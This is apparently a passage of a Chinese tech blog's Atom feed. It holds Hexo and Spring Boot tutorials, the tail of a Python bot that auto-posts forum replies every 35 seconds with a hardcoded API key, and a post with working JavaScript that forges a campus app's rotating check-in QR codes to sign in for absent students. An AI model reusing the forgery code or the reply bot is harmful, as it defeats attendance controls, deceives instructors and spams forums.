content=urllib.parse.quote(content)</span><br><span class="line">    //调用图灵机器人APi获取回复内容</span><br><span class="line">    tulingurl=<span class="string">&#x27;http://www.tuling123.com/openapi/api?key=0344bd2d86f33bda5654b941f757137a&amp;info=&#x27;</span>+content</span><br><span class="line">    message=fetch(tulingurl,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    message=message.decode(<span class="string">&#x27;UTF-8&#x27;</span>,<span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line">    message=json.loads(message)</span><br><span class="line">    messge=message[<span class="string">&quot;text&quot;</span>]</span><br><span class="line">    //生成UNIX时间戳</span><br><span class="line">    dtime = datetime.datetime.now()</span><br><span class="line">    ans_time = time.mktime(dtime.timetuple())</span><br><span class="line">    //构造回帖附带的参数</span><br><span class="line">    post=&#123;<span class="string">&#x27;message&#x27;</span>: messge, <span class="string">&#x27;posttime&#x27;</span>: <span class="built_in">int</span>(ans_time), <span class="string">&#x27;formhash&#x27;</span>: <span class="built_in">hash</span>, <span class="string">&#x27;usesig&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;subject&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">    //发送回帖请求</span><br><span class="line">    re=fetch2(url,refer,post);</span><br><span class="line">    print(re.decode(<span class="string">&#x27;UTF-8&#x27;</span>,<span class="string">&#x27;strict&#x27;</span>))</span><br><span class="line">    //设置定时器，<span class="number">35</span>秒执行一次,小米论坛每小时最多回复<span class="number">100</span>贴，建议间隔设置不要少于<span class="number">35</span>秒</span><br><span class="line">    <span class="keyword">global</span> timer</span><br><span class="line">    timer = threading.Timer(<span class="number">35</span>, mainfunc)</span><br><span class="line">    timer.start()</span><br><span class="line"></span><br><span class="line">//调用主函数</span><br><span class="line">mainfunc()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;工作原理&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#工作原理&quot;&gt;&lt;/a&gt; 工作原理&lt;/h1&gt;
&lt;p&gt;  先获取某个板块的Html页面，用正则表达式获取其中的帖子列表，然后随机抽一个。&lt;/p&gt;
&lt;p&gt;  获取帖子的标题，去生成比较靠谱</summary>
      
    
    
    
    <category term="Python" scheme="https://coder.lufer.cc/categories/Python/"/>
    
    
    <category term="Python" scheme="https://coder.lufer.cc/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>猫途校园签到的二维码伪造</title>
    <link href="https://coder.lufer.cc/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/%E7%8C%AB%E9%80%94%E6%A0%A1%E5%9B%AD%E7%AD%BE%E5%88%B0%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81%E4%BC%AA%E9%80%A0/"/>
    <id>https://coder.lufer.cc/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/%E7%8C%AB%E9%80%94%E6%A0%A1%E5%9B%AD%E7%AD%BE%E5%88%B0%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81%E4%BC%AA%E9%80%A0/</id>
    <published>2018-06-11T03:32:47.000Z</published>
    <updated>2021-12-17T03:59:35.254Z</updated>
    
    <content type="html"><![CDATA[<p>  这学期一直在用一个叫“猫途校园”的微信小程序签到，其不能代签的难度在于通过二维码扫码签到，由老师开始扫，被扫过的人才能扫码为别人签到，而且其二维码是在动态刷新的。</p><h2 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h2><p>  但是二维码的本质只是一条字符串，不如来研究一下他生成的二维码有什么规律。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/r6eRxA.jpg" alt="" /></p><p>  这个二维码解析出的字符串实际上就是下面这行<br />  <code>5ae928e07f6fd3003861f063&amp;5b1a59bcfe88c20036789d94&amp;1528453684116</code></p><p>  不难看出这是被&amp;分隔开的三个参数，再截一张变化后的图片可以发现，变化的只有第三个参数。</p><p>  我们可以大胆猜测，前两个参数有一个是课程ID，一个是用户ID，而程序通过改变第三个参数-UNIX时间戳来改变二维码。</p><h2 id="实现"><a class="markdownIt-Anchor" href="#实现"></a> 实现</h2><p>  既然有个二维码的生成规律，那么只要获取前两个参数就可以伪造了，而且这里也不用费劲的猜，只需截一张签到时的二维码截图即可获取前两个参数。</p><h3 id="上传图片"><a class="markdownIt-Anchor" href="#上传图片"></a> 上传图片</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过input来上传文件，选择文件后调用getUrl进行处理</span></span><br><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> onChange=<span class="string">&quot;getUrl(this,&#x27;file-url&#x27;)&quot;</span> name=<span class="string">&quot;&quot;</span> id=<span class="string">&quot;file&quot;</span> value=<span class="string">&quot;&quot;</span> /&gt;</span><br><span class="line"><span class="comment">//对上传的二维码进行解码，这里用到了qrcode库</span></span><br><span class="line"><span class="built_in">window</span>.analyticCode = &#123;</span><br><span class="line">getUrl : <span class="function"><span class="keyword">function</span>(<span class="params">type,elem,fn</span>)</span>&#123;</span><br><span class="line"><span class="keyword">let</span> url = <span class="literal">null</span>,src = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(type === <span class="string">&#x27;img-url&#x27;</span>)&#123;</span><br><span class="line">url = elem.src;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(type === <span class="string">&#x27;file-url&#x27;</span> &amp;&amp; elem.files.length &gt; <span class="number">0</span>)&#123;</span><br><span class="line">url = getObjectURL(elem.files[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line">qrcode.decode(url);</span><br><span class="line">qrcode.callback = <span class="function"><span class="keyword">function</span>(<span class="params">imgMsg</span>)</span>&#123;</span><br><span class="line">fn(imgMsg,url);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//对上传的文件进行处理，将其暂存在浏览器中，进行在线的图片预览，用于解码</span></span><br><span class="line"><span class="keyword">let</span> getObjectURL = <span class="function"><span class="keyword">function</span>(<span class="params">file</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> url = <span class="literal">null</span> ; </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">window</span>.createObjectURL!=<span class="literal">undefined</span>) &#123; <span class="comment">// basic</span></span><br><span class="line">        url = <span class="built_in">window</span>.createObjectURL(file) ;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">window</span>.URL!=<span class="literal">undefined</span>) &#123; <span class="comment">// mozilla(firefox)</span></span><br><span class="line">        url = <span class="built_in">window</span>.URL.createObjectURL(file) ;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">window</span>.webkitURL!=<span class="literal">undefined</span>) &#123; <span class="comment">// webkit or chrome</span></span><br><span class="line">        url = <span class="built_in">window</span>.webkitURL.createObjectURL(file) ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> url ;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//调用analyticCode.getUrl,并在执行完成后执行后面的回调函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUrl</span>(<span class="params">e,param</span>)</span>&#123;</span><br><span class="line">analyticCode.getUrl(param,e,<span class="function"><span class="keyword">function</span>(<span class="params">url1,url2</span>)</span>&#123;</span><br><span class="line">        <span class="comment">//返回的Url1即为解析二维码所得字符串，我们再把它用&amp;分隔开</span></span><br><span class="line">        <span class="keyword">var</span> str=url1.split(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">        <span class="comment">//取前两个参数，生成新的二维码</span></span><br><span class="line">createqrcode(str[<span class="number">0</span>],str[<span class="number">1</span>]);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createqrcode</span>(<span class="params">para1,para2</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">link=link+<span class="string">&quot;?p1=&quot;</span>+para1+<span class="string">&quot;&amp;p2=&quot;</span>+para2;</span><br><span class="line">    $(<span class="string">&quot;#sharelink&quot;</span>).val(link);</span><br><span class="line">    <span class="comment">//设定一个循环，每秒刷新</span></span><br><span class="line"><span class="built_in">window</span>.setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//获取当前的UNIX时间戳</span></span><br><span class="line">        <span class="keyword">var</span> time=<span class="built_in">Math</span>.round(<span class="keyword">new</span> <span class="built_in">Date</span>().getTime());</span><br><span class="line">        <span class="comment">//拼接新的字符串</span></span><br><span class="line">        <span class="keyword">var</span> code=para1+<span class="string">&quot;&amp;&quot;</span>+para2+<span class="string">&quot;&amp;&quot;</span>+time;</span><br><span class="line">        <span class="comment">//获取用于显示二维码的元素</span></span><br><span class="line">        <span class="keyword">var</span> d=<span class="built_in">document</span>.getElementById(<span class="string">&#x27;code&#x27;</span>);</span><br><span class="line">        <span class="comment">//清空先前的二维码</span></span><br><span class="line">        d.innerHTML=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">//用字符串生成新的二维码</span></span><br><span class="line"><span class="keyword">new</span> QRCode(d, code);</span><br><span class="line">&#125;,<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  生成的结果如下</p><p><img src="https://pic.lufer.cc/images/2021/03/15/r6e22d.jpg" alt="" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  这学期一直在用一个叫“猫途校园”的微信小程序签到，其不能代签的难度在于通过二维码扫码签到，由老师开始扫，被扫过的人才能扫码为别人签到，而且其二维码是在动态刷新的。&lt;/p&gt;
&lt;h2 id=&quot;原理&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#原</summary>
      
    
    
    
    <category term="JavaScript" scheme="https://coder.lufer.cc/categories/JavaScript/"/>
    
    
    <category term="Qrcode" scheme="https://coder.lufer.cc/tags/Qrcode/"/>
    
    <category term="JavaScript" scheme="https://coder.lufer.cc/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>Hexo+VsCode 在IDE中完成博客的一切操作</title>
    <link href="https://coder.lufer.cc/Hexo/%E5%9C%A8IDE%E4%B8%AD%E5%AE%8C%E6%88%90%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%B8%80%E5%88%87%E6%93%8D%E4%BD%9C/"/>
    <id>https://coder.lufer.cc/Hexo/%E5%9C%A8IDE%E4%B8%AD%E5%AE%8C%E6%88%90%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%B8%80%E5%88%87%E6%93%8D%E4%BD%9C/</id>
    <published>2018-06-09T06:27:30.000Z</published>
    <updated>2021-12-17T03:59:35.254Z</updated>
    
    <content type="html"><![CDATA[<h1 id="插件安装"><a class="markdownIt-Anchor" href="#插件安装"></a> 插件安装</h1><p>  在VSCode的插件库中搜索Hexo，安装VSCode-Hexo，安装完成之后重启VSCode。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/eINKA0.png" alt="" /></p><h1 id="新建文章"><a class="markdownIt-Anchor" href="#新建文章"></a> 新建文章</h1><p>  首先需要在博客目录中打开VScode。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/eINaAx.png" alt="" /></p><p>  按下<code>Ctrl+Shift+P</code>，呼出终端。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/eINn7q.png" alt="" /></p><p>  输入hexo new。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/eINmBn.png" alt="" /></p><p>  输入布局种类，可以选post（文章），page（页面）,draft(草稿)。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/eINVXj.png" alt="" /></p><ol><li>Post<br />  post就是通常的文章，会被自动归档和处理。</li><li>Page<br />  page是一种页面，例如标签页啊，分类页啊，关于作者啊这种页面。</li><li>Draft<br />  草稿不会被加到目录中，也不能通过链接访问，用来临时存放文章或者放一些不公开的文章。</li></ol><p>  要写文章选Post就好了,然后输入title，即文章标题。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/eINens.png" alt="" /></p><p>  回车之后控制台输出</p><p><img src="https://pic.lufer.cc/images/2021/03/15/eINMNV.png" alt="" /></p><p>  文章生成，可在source/_posts下找到对应的md文件。</p><h1 id="发布文章"><a class="markdownIt-Anchor" href="#发布文章"></a> 发布文章</h1><p>  发布有两个步骤，生成和部署。<br />  按下Ctrl+Shift+P，呼出终端，输入Hexo generate</p><p><img src="https://pic.lufer.cc/images/2021/03/15/eINQhT.png" alt="" /></p><p>  选择参数，无需填写，直接回车</p><p><img src="https://pic.lufer.cc/images/2021/03/15/eIN19U.png" alt="" /></p><p>  启动生成，控制台输出如下信息</p><p><img src="https://pic.lufer.cc/images/2021/03/15/eIN33F.png" alt="" /></p><p>  生成成功</p><p><img src="https://pic.lufer.cc/images/2021/03/15/eIN8c4.png" alt="" /></p><p>  按下Ctrl+Shift+P，呼出终端，输入Hexo deploy</p><p><img src="https://pic.lufer.cc/images/2021/03/15/eINGjJ.png" alt="" /></p><p>  选择参数，无需填写，直接回车</p><p><img src="https://pic.lufer.cc/images/2021/03/15/eINYu9.png" alt="" /></p><p>  启动生成，控制台输出如下信息</p><p><img src="https://pic.lufer.cc/images/2021/03/15/eINtBR.png" alt="" /></p><p>  生成成功</p><p><img src="https://pic.lufer.cc/images/2021/03/15/eINNH1.png" alt="" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;插件安装&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#插件安装&quot;&gt;&lt;/a&gt; 插件安装&lt;/h1&gt;
&lt;p&gt;  在VSCode的插件库中搜索Hexo，安装VSCode-Hexo，安装完成之后重启VSCode。&lt;/p&gt;
&lt;p&gt;&lt;img src</summary>
      
    
    
    
    <category term="Hexo" scheme="https://coder.lufer.cc/categories/Hexo/"/>
    
    
    <category term="Hexo" scheme="https://coder.lufer.cc/tags/Hexo/"/>
    
    <category term="前端" scheme="https://coder.lufer.cc/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>SpingBoot常见注解说明</title>
    <link href="https://coder.lufer.cc/%E5%90%8E%E7%AB%AF/SpingBoot%E5%B8%B8%E8%A7%81%E6%B3%A8%E8%A7%A3%E8%AF%B4%E6%98%8E/"/>
    <id>https://coder.lufer.cc/%E5%90%8E%E7%AB%AF/SpingBoot%E5%B8%B8%E8%A7%81%E6%B3%A8%E8%A7%A3%E8%AF%B4%E6%98%8E/</id>
    <published>2018-06-07T10:59:30.000Z</published>
    <updated>2021-04-06T02:18:41.056Z</updated>
    
    <content type="html"><![CDATA[<ul><li><a href="#Bean%E7%B1%BB">Bean类</a><ul><li><a href="#Service">@Service</a></li><li><a href="#Controller">@Controller</a></li><li><a href="#Repository">@Repository</a></li><li><a href="#Component">@Component</a></li></ul></li><li><a href="#Response%E7%B1%BB">Response类</a><ul><li><a href="#RequestMapping">@RequestMapping</a></li><li><a href="#ResponseBody">@ResponseBody</a></li><li><a href="#RestController">@RestController</a></li><li><a href="#Component">@Component</a></li></ul></li><li><a href="#Lombok%E7%B1%BB">Lombok类</a><ul><li><a href="#@Getter/@Setter">@@Getter/@Setter</a></li><li><a href="#Data">@Data</a></li><li><a href="#Cleanup">@Cleanup</a></li><li><a href="#EqualsAndHashCode">@EqualsAndHashCode</a></li><li><a href="#AllArgsConstructor">@AllArgsConstructor</a></li><li><a href="#NoArgsConstructor">@NoArgsConstructor</a></li><li><a href="#Builder">@Builder</a></li><li><a href="#NonNull">@NonNull</a></li></ul></li><li><a href="#%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E7%B1%BB">异常处理类</a><ul><li><a href="#ControllerAdvice">@ControllerAdvice</a></li><li><a href="#ExceptionHandler">@ExceptionHandler</a></li><li><a href="#RestController">@RestController</a></li><li><a href="#Component">@Component</a></li></ul></li><li><a href="#%E5%85%B6%E4%BB%96">其他</a><ul><li><a href="#Autowired">@Autowired</a></li></ul></li></ul><h1 id="bean类"><a class="markdownIt-Anchor" href="#bean类"></a> Bean类</h1><h2 id="service"><a class="markdownIt-Anchor" href="#service"></a> @Service</h2><p>  注解在类上，表示这是一个业务层bean。</p><h2 id="controller"><a class="markdownIt-Anchor" href="#controller"></a> @Controller</h2><p>  注解在类上，表示这是一个控制层bean,可以解析返回的jsp,html页面，并且跳转到相应页面。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value=&quot;/gouploadimg&quot;, method = RequestMethod.GET)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">goUploadImg</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//跳转到 templates 目录下的 uploadimg.html</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;uploadimg&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="repository"><a class="markdownIt-Anchor" href="#repository"></a> @Repository</h2><p>  注解在类上，表示这是一个数据访问层bean。</p><h2 id="component"><a class="markdownIt-Anchor" href="#component"></a> @Component</h2><p>  注解在类上，表示通用bean。</p><h1 id="response类"><a class="markdownIt-Anchor" href="#response类"></a> Response类</h1><h2 id="requestmapping"><a class="markdownIt-Anchor" href="#requestmapping"></a> @RequestMapping</h2><p>  用于进行路径映射。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对test路径进行映射，其下方函数用于对路径test的请求进行处理</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span> </span><br><span class="line"><span class="comment">//其默认参数为value，即不指定时，参数当做value处理，上一行等价于</span></span><br><span class="line"><span class="meta">@RequestMapping(value=&quot;/test&quot;)</span></span><br><span class="line"><span class="comment">//method:指定请求的method类型， GET、POST、PUT、DELETE等</span></span><br><span class="line"><span class="meta">@RequestMapping(value=&quot;/test&quot;, method=RequestMethod.GET)</span></span><br><span class="line"><span class="comment">//consumes:指定处理请求的提交内容类型（Content-Type），例如application/json,text/html</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;/test&quot;, method=RequestMethod.POST,consumes=&quot;application/json&quot;)</span></span><br><span class="line"><span class="comment">//produces:指定返回的内容类型，但仅当请求头中的(Accept)类型也是该类型时才处理请求</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;/test&quot;, method=RequestMethod.GET,produces=&quot;application/json&quot;)</span></span><br><span class="line"><span class="comment">//params:指定request中必须包含某些参数值时，才让该方法处理</span></span><br><span class="line"><span class="comment">//仅处理请求中包含了名为“myParam”，值为“myValue”的请求</span></span><br><span class="line"> <span class="meta">@RequestMapping(value = &quot;/test&quot;, method = RequestMethod.GET, params=&quot;myParam=myValue&quot;)</span></span><br><span class="line"><span class="comment">//headers:指定request中必须包含某些指定的header值，才能让该方法处理请求</span></span><br><span class="line"><span class="comment">//仅处理request的header中包含了指定“Refer”请求头和对应值为“http://www.ifeng.com/”的请求；</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;/test&quot;, method = RequestMethod.GET, headers=&quot;Referer=http://www.ifeng.com/&quot;)</span></span><br></pre></td></tr></table></figure><h2 id="responsebody"><a class="markdownIt-Anchor" href="#responsebody"></a> @ResponseBody</h2><p>  加在controller函数的前面，可以将返回的对象自动转换为json字符串。</p><h2 id="restcontroller"><a class="markdownIt-Anchor" href="#restcontroller"></a> @RestController</h2><p>  相当于@ResponseBody和@Controller的结合。</p><h1 id="lombok类"><a class="markdownIt-Anchor" href="#lombok类"></a> Lombok类</h1><p>  lombok是一个注解种类，可以自动生成一些方法，从而减少开发复杂度。</p><h2 id="gettersetter"><a class="markdownIt-Anchor" href="#gettersetter"></a> @Getter/@Setter</h2><p>  可以用@Getter/@Setter注释任何字段（当然也可以注释到类上的），lombok会自动生成默认的getter/setter方法。</p><h2 id="data"><a class="markdownIt-Anchor" href="#data"></a> @Data</h2><p>  相当于<code>@Getter @Setter @RequiredArgsConstructor @ToString @EqualsAndHashCode</code>这5个注解的合集。<br />  可自动生成类的Get和Set等方法。</p><h2 id="cleanup"><a class="markdownIt-Anchor" href="#cleanup"></a> @Cleanup</h2><p>  可以加在IO变量声明之前，这样会在使用后自动释放IO变量。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Cleanup</span> InputStream in = <span class="keyword">new</span> FileInputStream(path);</span><br></pre></td></tr></table></figure><h2 id="equalsandhashcode"><a class="markdownIt-Anchor" href="#equalsandhashcode"></a> @EqualsAndHashCode</h2><p>  此注解会生成equals(Object other) 和 hashCode()方法。</p><h2 id="allargsconstructor"><a class="markdownIt-Anchor" href="#allargsconstructor"></a> @AllArgsConstructor</h2><p>  为类生成包含所有参数的构造函数。</p><h2 id="noargsconstructor"><a class="markdownIt-Anchor" href="#noargsconstructor"></a> @NoArgsConstructor</h2><p>  为类生成无参数的构造函数。</p><h2 id="builder"><a class="markdownIt-Anchor" href="#builder"></a> @Builder</h2><p>  建筑者模式，是现在比较推崇的一种构建值对象的方式。<br />  会为类生成各种构造函数。</p><h2 id="nonnull"><a class="markdownIt-Anchor" href="#nonnull"></a> @NonNull</h2><p>  注解在参数上 如果该参数为null 会throw new NullPointerException(参数名)。</p><h1 id="异常处理类"><a class="markdownIt-Anchor" href="#异常处理类"></a> 异常处理类</h1><h2 id="controlleradvice"><a class="markdownIt-Anchor" href="#controlleradvice"></a> @ControllerAdvice</h2><p>  被ControllerAdvice注解的类会被认为是用来进行全局异常处理的类。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ControllerAdvice</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GlobalExceptionHandler</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="exceptionhandler"><a class="markdownIt-Anchor" href="#exceptionhandler"></a> @ExceptionHandler</h2><p>  用于确认被其注释的方法所要处理的异常类型。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ControllerAdvice</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GlobalExceptionHandler</span> </span>&#123;</span><br><span class="line">    <span class="comment">//接管运行时异常，进行处理</span></span><br><span class="line">    <span class="meta">@ExceptionHandler(RuntimeException.class)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function">String <span class="title">handleException</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Exception Deal!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h1><h2 id="autowired"><a class="markdownIt-Anchor" href="#autowired"></a> @Autowired</h2><p>  自动填充，可以通过Autowired引入需要新建的对象，就无需每次调用时新建。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span>  LocaleMessageSourceUtil localeMessageSourceUtil;</span><br></pre></td></tr></table></figure><p>  就相当于：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span>  LocaleMessageSourceUtil localeMessageSourceUtil=<span class="keyword">new</span> LocaleMessageSourceUtil();</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#Bean%E7%B1%BB&quot;&gt;Bean类&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#Service&quot;&gt;@Service&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#Controller&quot;&gt;@Controller&lt;/a&gt;&lt;/li&gt;
&lt;li</summary>
      
    
    
    
    <category term="Java" scheme="https://coder.lufer.cc/categories/Java/"/>
    
    
    <category term="Java" scheme="https://coder.lufer.cc/tags/Java/"/>
    
    <category term="Spring Boot" scheme="https://coder.lufer.cc/tags/Spring-Boot/"/>
    
  </entry>
  
  <entry>
    <title>Spring Boot自定义异常处理与返回状态</title>
    <link href="https://coder.lufer.cc/%E5%90%8E%E7%AB%AF/Sping%20Boot%E8%87%AA%E5%AE%9A%E4%B9%89%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E4%B8%8E%E8%BF%94%E5%9B%9E%E7%8A%B6%E6%80%81/"/>
    <id>https://coder.lufer.cc/%E5%90%8E%E7%AB%AF/Sping%20Boot%E8%87%AA%E5%AE%9A%E4%B9%89%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E4%B8%8E%E8%BF%94%E5%9B%9E%E7%8A%B6%E6%80%81/</id>
    <published>2018-06-07T10:54:42.000Z</published>
    <updated>2021-04-06T02:18:39.189Z</updated>
    
    <content type="html"><![CDATA[<p>  本文目的：集成Spring Boot的异常处理类，进行自定义的全局异常处理，并自定义返回的HTTP状态码。</p><blockquote><p>目录</p></blockquote><ul><li><a href="#%E6%96%B0%E5%BB%BA%E5%BC%82%E5%B8%B8%E7%B1%BB%E5%9E%8B">新建异常类型</a></li><li><a href="#%E7%BB%93%E6%9E%9C%E5%A4%84%E7%90%86%E7%B1%BB">结果处理类</a></li><li><a href="#%E6%8E%A5%E7%AE%A1%E5%85%A8%E5%B1%80%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86">接管全局异常处理</a></li></ul><h1 id="新建异常类型"><a class="markdownIt-Anchor" href="#新建异常类型"></a> 新建异常类型</h1><p>  新建一个BusinessException并继承自RuntimeException。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BusinessException</span> <span class="keyword">extends</span> <span class="title">RuntimeException</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> String message;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BusinessException</span><span class="params">(String resultCode)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.message=resultCode;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="结果处理类"><a class="markdownIt-Anchor" href="#结果处理类"></a> 结果处理类</h1><p>  建立一个结果处理类，对异常进行一些封装，从而获得一个格式化的返回结果。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Builder</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DefaultErrorResult</span>  </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Integer status;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> DefaultErrorResult <span class="title">failure</span><span class="params">(BusinessException e)</span> </span>&#123;</span><br><span class="line">        DefaultErrorResult result = <span class="keyword">new</span> DefaultErrorResult();</span><br><span class="line">        result.setMessage(e.getMessage());</span><br><span class="line">        result.setStatus(<span class="number">600</span>);</span><br><span class="line">        result.setError(<span class="string">&quot;Business Error&quot;</span>);</span><br><span class="line">        result.setException(e.getClass().getName());</span><br><span class="line">        result.setPath(RequestContextHolderUtil.getRequest().getRequestURI());</span><br><span class="line">        result.setTimestamp(<span class="keyword">new</span> Date());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="接管全局异常处理"><a class="markdownIt-Anchor" href="#接管全局异常处理"></a> 接管全局异常处理</h1><p>  建立ExceptionHandler类，通过@ControllerAdvice注解，接管全局的异常处理。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ControllerAdvice</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GlobalExceptionHandler</span>  </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 处理400类异常</span></span><br><span class="line"><span class="comment">     * 违反约束异常</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@ResponseStatus(HttpStatus.BAD_REQUEST)</span></span><br><span class="line">    <span class="meta">@ExceptionHandler(ConstraintViolationException.class)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> DefaultErrorResult <span class="title">handleConstraintViolationException</span><span class="params">(ConstraintViolationException e, HttpServletRequest request)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        log.error(<span class="string">&quot;handleConstraintViolationException start, uri:&#123;&#125;, caused by: &quot;</span>, request.getRequestURI(), e);</span><br><span class="line">        List&lt;ParameterInvalidItem&gt; parameterInvalidItemList = ParameterInvalidItemHelper.convertCVSetToParameterInvalidItemList(e.getConstraintViolations());</span><br><span class="line">        <span class="keyword">return</span> DefaultErrorResult.failure(ResultCode.COMM_PARAM_IS_INVALID, e, HttpStatus.BAD_REQUEST, parameterInvalidItemList);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 处理验证参数封装错误时异常</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@ResponseStatus(HttpStatus.BAD_REQUEST)</span></span><br><span class="line">    <span class="meta">@ExceptionHandler(HttpMessageNotReadableException.class)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> DefaultErrorResult <span class="title">handleConstraintViolationException</span><span 